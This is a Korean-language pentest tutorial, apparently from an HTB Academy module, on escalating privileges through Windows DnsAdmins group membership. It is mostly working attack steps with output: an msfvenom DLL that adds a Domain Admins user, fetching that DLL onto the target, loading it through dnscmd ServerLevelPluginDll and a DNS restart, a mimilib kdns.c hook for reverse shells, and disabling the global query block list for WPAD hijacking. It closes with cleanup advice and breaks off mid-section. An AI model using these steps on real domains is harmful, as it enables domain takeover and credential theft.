# DNS Admin

[DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) 그룹의 구성원은 <mark style="background-color:orange;">네트워크의 DNS 정보에 액세스</mark>할 수 있습니다. Windows DNS 서비스는 사용자 지정 플러그인을 지원하며, 로컬로 호스팅된 DNS 영역의 범위에 속하지 않는 이름 쿼리를 해결하기 위해 플러그인에서 함수를 호출할 수 있습니다. DNS 서비스는 `NT AUTHORITY\SYSTEM으로` 실행되므로 이 그룹의 구성원은 도메인 컨트롤러에 대한 권한을 에스컬레이션하거나 별도의 서버가 도메인의 DNS 서버로 작동하는 상황에서 잠재적으로 활용될 수 있습니다. 내장된 [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) 유틸리티를 사용하여 플러그인 DLL의 경로를 지정할 수 있습니다. 이 훌륭한 [게시물에](https://adsecurity.org/?p=4064) 자세히 설명된 대로 도메인 컨트롤러에서 DNS가 실행될 때 다음과 같은 공격을 수행할 수 있습니다(매우 일반적임):

* DNS 관리는 RPC를 통해 수행됩니다.
* [ServerLevelPluginDll을](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) 사용하면 DLL 경로를 확인하지 않고도 사용자 정의 DLL을 로드할 수 있습니다. 이 작업은 명령줄에서 `dnscmd` 도구를 사용하여 수행할 수 있습니다.
* `DnsAdmins` 그룹의 구성원이 아래 `dnscmd` 명령을 실행하면 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\서비스의\DNS\파라미터\서버레벨플러그인Dll` 레지스트리 키가 채워집니다.
* DNS 서비스가 다시 시작되면 이 경로에 있는 DLL(즉, 도메인 컨트롤러의 컴퓨터 계정이 액세스할 수 있는 네트워크 공유)이 로드됩니다.
* <mark style="background-color:orange;">공격자는 사용자 지정 DLL을 로드하여 리버스 셸을 얻거나 Mimikatz와 같은 툴을 DLL로 로드하여 자격 증명을 덤프</mark>할 수도 있습니다.

### <mark style="background-color:orange;">DnsAdmins 액세스 활용</mark> <a href="#dnsadmins" id="dnsadmins"></a>

**악성 DLL 생성**

악성 DLL을 생성하여 `msfvenom을` 사용하여 `도메인 관리자` 그룹에 사용자를 추가할 수 있습니다.

&#x20; 악성 DLL 생성

```
realblackcat@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

**로컬 HTTP 서버 시작**

다음으로 Python HTTP 서버를 시작합니다.

&#x20; 로컬 HTTP 서버 시작

```
realblackcat@htb[/htb]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```

&#x20;Others : smbserver 시작, 파일 다운&#x20;

```bash
root@kali: smbserver.py s .
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.3\s\rev.dll
```



**Target에 파일 다운로드**

대상에 파일을 다운로드합니다.

&#x20; Target에 파일 다운로드

```
PS C:\htb> wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

먼저 권한이 없는 사용자로 `dnscmd` 유틸리티를 사용하여 사용자 지정 DLL을 로드하면 어떤 일이 발생하는지 살펴 보겠습니다.

**비권한 사용자로 DLL 로드하기**

&#x20; 비권한 사용자로 DLL 로드하기

```
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

예상대로 일반 사용자로 이 명령을 실행하려고 하면 성공하지 못합니다. 이 명령은 `DnsAdmins` 그룹의 구성원만 수행할 수 있습니다.

**DnsAdmin의 구성원으로 DLL 로드하기**

&#x20; DnsAdmin의 구성원으로 DLL 로드하기

```
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109  
```

**사용자 지정 DLL 로드**

`DnsAdmins` 그룹에서 그룹 멤버십을 확인한 후 명령을 다시 실행하여 사용자 지정 DLL을 로드할 수 있습니다.

&#x20; 사용자 지정 DLL 로드

```
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

참고: 사용자 지정 DLL의 전체 경로를 지정해야 하며, 그렇지 않으면 공격이 제대로 작동하지 않습니다.

레지스트리 키에 대한 직접적인 권한이 없으므로 `DnsAdmins` 그룹의 구성원만 `dnscmd` 유틸리티를 사용할 수 있습니다.

악성 플러그인의 경로가 포함된 레지스트리 설정이 구성되고 페이로드가 생성되면 다음에 DNS 서비스가 시작될 때 DLL이 로드됩니다. DnsAdmins 그룹의 구성원이라고 해서 DNS 서비스를 다시 시작할 수 있는 권한은 없지만, 시스템 관리자가 DNS 관리자에게 이 작업을 허용할 수 있습니다.

DNS 서비스를 다시 시작한 후(사용자에게 이 수준의 액세스 권한이 있는 경우) 사용자 지정 DLL을 실행하고 사용자를 추가하거나(우리의 경우) 리버스 셸을 가져올 수 있어야 합니다. DNS 서버를 다시 시작할 수 있는 액세스 권한이 없는 경우 서버 또는 서비스가 다시 시작될 때까지 기다려야 합니다. DNS 서비스에 대한 현재 사용자의 권한을 확인해 보겠습니다.

**사용자 SID 찾기**

먼저 사용자의 SID가 필요합니다.

&#x20; 사용자 SID 찾기

```
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

**DNS 서비스에 대한 권한 확인**

사용자의 SID를 알면 `sc` 명령을 사용하여 서비스에 대한 권한을 확인할 수 있습니다. 이 [문서에](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/) 따르면 사용자에게 각각 `SERVICE_START` 및 `SERVICE_STOP으로` 변환되는 `RPWP` 권한이 있음을 알 수 있습니다.

&#x20; DNS 서비스에 대한 권한 확인

```
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

Windows의 SDDL 구문에 대한 설명은 `Windows 기초` 모듈을 참조하세요.

**DNS 서비스 중지**

이러한 권한을 확인한 후 다음 명령을 실행하여 서비스를 중지하고 시작할 수 있습니다.

&#x20; DNS 서비스 중지

```
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

DNS 서비스가 사용자 지정 DLL을 시작하고 실행하려고 시도하지만 상태를 확인하면 올바르게 시작하지 못한 것으로 표시됩니다(나중에 자세히 설명합니다).

**DNS 서비스 시작**

&#x20; DNS 서비스 시작

```
C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```

**그룹 멤버십 확인**

모든 것이 계획대로 진행되면 계정이 도메인 관리자 그룹에 추가되거나 연결을 다시 제공하기 위해 사용자 지정 DLL을 만든 경우 리버스 셸을 받게 됩니다.

&#x20; 그룹 멤버십 확인

```
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

***

### 정리 <a href="#undefined" id="undefined"></a>

도메인 컨트롤러에서 구성을 변경하고 DNS 서비스를 중지/재시작하는 것은 매우 파괴적인 작업이므로 매우 신중하게 수행해야 합니다. 침투 테스터로서 이러한 유형의 작업을 진행하기 전에 클라이언트가 먼저 실행해야 하는데, 이는 잠재적으로 전체 Active Directory 환경의 DNS를 다운시키고 많은 문제를 일으킬 수 있기 때문입니다. 고객이 이 공격을 진행하도록 허락하는 경우, 저희는 흔적을 남기지 않고 직접 정리하거나 고객에게 변경 사항을 되돌릴 수 있는 단계를 제공할 수 있어야 합니다.

이러한 단계는 로컬 또는 도메인 관리자 계정으로 상승된 콘솔에서 수행해야 합니다.

**레지스트리 키 추가 확인**

첫 번째 단계는 `ServerLevelPluginDll` 레지스트리 키가 존재하는지 확인하는 것입니다. 사용자 지정 DLL을 제거하기 전까지는 DNS 서비스를 다시 올바르게 시작할 수 없습니다.

&#x20; 레지스트리 키 추가 확인

```
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

**레지스트리 키 삭제**

`reg 삭제` 명령을 사용하여 사용자 지정 DLL을 가리키는 키를 제거할 수 있습니다.

&#x20; 레지스트리 키 삭제

```
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

**DNS 서비스 다시 시작**

이 작업이 완료되면 DNS 서비스를 다시 시작할 수 있습니다.

&#x20; DNS 서비스 다시 시작

```
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

**DNS 서비스 상태 확인**

모든 것이 계획대로 진행되었다면 DNS 서비스를 쿼리하면 실행 중임을 알 수 있습니다. 또한 로컬 호스트 또는 도메인의 다른 호스트에 대해 `nslookup을` 수행하여 DNS가 환경 내에서 올바르게 작동하고 있는지 확인할 수 있습니다.

&#x20; DNS 서비스 상태 확인

```
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

다시 한 번 강조하지만, 이는 잠재적으로 파괴적인 공격이므로 고객의 명시적인 허가를 받고 고객과 협력하여 수행해야 합니다. 고객이 위험을 이해하고 전체 개념 증명을 보고자 하는 경우 이 섹션에 설명된 단계에 따라 공격을 시연하고 이후에 정리하는 데 도움이 될 것입니다.

***

### Mimilib.dll 사용 <a href="#mimilib-dll" id="mimilib-dll"></a>

이 [게시물에서](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) 자세히 설명한 것처럼, `Mimikatz` 도구 개발자가 만든 [mimilib.dll을](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) 활용하여 역셸 원라이너 또는 원하는 다른 명령을 실행하도록 [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) 파일을 수정하여 명령 실행 권한을 얻을 수도 있습니다.

코드: c

```
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

***

### WPAD 레코드 만들기 <a href="#wpad" id="wpad"></a>

DnsAdmins 그룹 권한을 남용하는 또 다른 방법은 WPAD 레코드를 만드는 것입니다. 이 그룹의 멤버가 되면 기본적으로 이 공격을 차단하는 [글로벌 쿼리 차단 보안을 비활성화할](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps) 수 있는 권한이 부여됩니다. Server 2008에서는 DNS 서버의 전역 쿼리 차단 목록에 추가하는 기능이 처음 도입되었습니다. 기본적으로 WPAD(웹 프록시 자동 검색 프로토콜)와 ISATAP(사이트 내 자동 터널 주소 지정 프로토콜)가 글로벌 쿼리 차단 목록에 있습니다. 이러한 프로토콜은 하이재킹에 매우 취약하며, 모든 도메인 사용자는 이러한 이름이 포함된 컴퓨터 개체 또는 DNS 레코드를 만들 수 있습니다.

글로벌 쿼리 차단 목록을 비활성화하고 WPAD 레코드를 생성하면 기본 설정으로 WPAD를 실행하는 모든 머신이 공격 머신을 통해 트래픽을 프록시하게 됩니다. [Responder](https://github.com/lgandx/Responder) 또는 [Inveigh와](https://github.com/Kevin-Robertson/Inveigh) 같은 도구를 사용하여 트래픽 스푸핑을 수행하고 비밀번호 해시를 캡처하여 오프라인에서 크래킹하거나 SMBRelay 공격을 수행할 수 있습니다.

**글로벌 쿼리 차단 목록 비활성화하기**

이 공격을 설정하기 위해 먼저 글로벌 쿼리 차단 목록을 비활성화했습니다:

&#x20; 글로벌 쿼리 차단 목록 비활성화하기

```
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

**WPAD 레코드 추가**

다음으로 공격 머신을 가리키는 WPAD 레코드를 추가합니다.

&#x20; WPAD 레코드 추가

